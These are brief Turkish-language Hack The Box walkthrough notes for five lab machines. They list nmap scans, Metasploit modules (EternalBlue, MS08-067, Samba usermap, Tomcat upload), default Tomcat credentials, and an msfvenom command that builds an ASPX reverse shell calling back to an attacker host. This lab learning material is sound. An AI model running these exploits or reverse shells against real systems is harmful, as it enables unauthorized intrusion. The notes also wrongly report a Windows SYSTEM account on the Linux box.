# Hack The Box Hakkında
Bu bölümde bazı Hack The Box makinelerinin çözümlerine yönelik kısa notlar paylaşılarak yöntemler açıklanmıştır.

## Legacy (windows)

- nmap -A -T4 -p- IP
- msfconsole
    - search smb_version
- Google - > smb Windows XP SP3 exploit > rapid7
- msfconsole
    - use use exploit/windows/smb/ms08_067_netapi
- NT AUTHORITY\SYSTEM (Pwned)


## Lame (linux)
- nmap -A -T4 -p- IP
- Google -> samba 3.0.2 exploit > rapid7
- msfconsole
  - use exploit/multi/samba/usermap_script
- NT AUTHORITY\SYSTEM (Pwned)

## Blue (windows)
- nmap -A -T4 -p- IP
- Google -> smb Windows 7 Professional 7601 exploit -> rapid7
- msfconsole
  -use exploit/windows/smb/ms17_010_eternalblue
- NT AUTHORITY\SYSTEM (Pwned)

## Devel (windows)
- nmap -A -T4 -p- IP
- ftp (anonymous) login
- ftp dosyaları == microsoft iis dosyaları
- msfvenom -> aspx reverseshell (msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx)
- ftp put shell.aspx
- msfconsole multi handler
- tarayıcı -> http://IP/shell.aspx -> meterpreter(IIS APPPOOL\Web)
- background -> 
- use post/multi/recon/local_exploit_suggester -> exploit/windows/local/ms10_015_kitrap0d
- use exploit/windows/local/ms10_015_kitrap0d
- ps
- migrate (notepad PID)
- shell -> read flags (Pwned)


# Jerry (windows)
- nmap -A -T4 -p- IP
- dirsearch - nikto http://IP/8080 (tomcat)
- Google > "tomcat 7.0.88 exploit"
- dirsearch -> http://IP:8080/host-manager/html -> http password ? > tomcat,s3cret ||  auxiliary/scanner/http/tomcat_mgr_login
- msfconsole - exploit/multi/http/tomcat_jsp_upload_bypass
- NT AUTHORITY\SYSTEM (Pwned)


